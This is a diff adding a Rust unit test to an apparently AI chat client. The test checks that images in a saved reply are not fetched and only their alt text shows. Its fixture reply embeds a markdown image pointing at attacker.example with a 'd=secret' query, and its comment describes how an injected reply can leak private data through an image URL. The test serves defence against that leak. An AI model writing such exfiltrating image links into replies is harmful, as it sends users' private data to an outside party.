@@ -782,6 +782,25 @@ mod tests {
     }
 
     #[test]
+    fn a_remote_image_in_a_reply_is_never_fetched_only_its_alt_text_shows() {
+        // An injected reply can hide private data in an image's URL; drawing it would send it.
+        use crate::history::{Loaded, LoadedMessage, ReplyState, SavedReply};
+        let text = "Done.\n\n![your inbox summary](https://attacker.example/p.png?d=secret)\n\nSee [the docs](https://example.com/x?d=secret).";
+        let mut chat = Chat::new(None);
+        chat.place(Insets::default(), [1440.0, 900.0]);
+        chat.open();
+        let message = LoadedMessage { text: "hi".into(), files: Vec::new(), pngs: Vec::new(), reply: Some(SavedReply { state: ReplyState::Done, text: text.into(), ..SavedReply::default() }) };
+        chat.load(Loaded { id: "20240101-000000-0004".into(), created: 1, title: None, title_by_user: false, session: None, messages: vec![message], next_png: 0 });
+        let mut rt = Runtime::new(W { chat }, window, (1440.0, 900.0), Env::new(true, 2.0));
+        settle(&mut rt, 10);
+        let els = rt.elements();
+        // The chat hands its markdown no pictures (`Markdown::images`), so each image is the
+        // broken-image placeholder: a glyph and its alt text, written out.
+        assert!(els.iter().any(|e| e.role == "image" && e.label.as_deref() == Some("your inbox summary")));
+        assert!(els.iter().any(|e| e.role == "text" && e.text.as_deref() == Some("your inbox summary")), "its alt text shows, as the placeholder");
+    }
+
+    #[test]
     fn a_reopened_question_nobody_answered_says_not_answered_and_offers_no_answer() {
         use crate::history::{self, Loaded, LoadedMessage};
         let mut asked = Reply::new(1, "which?");
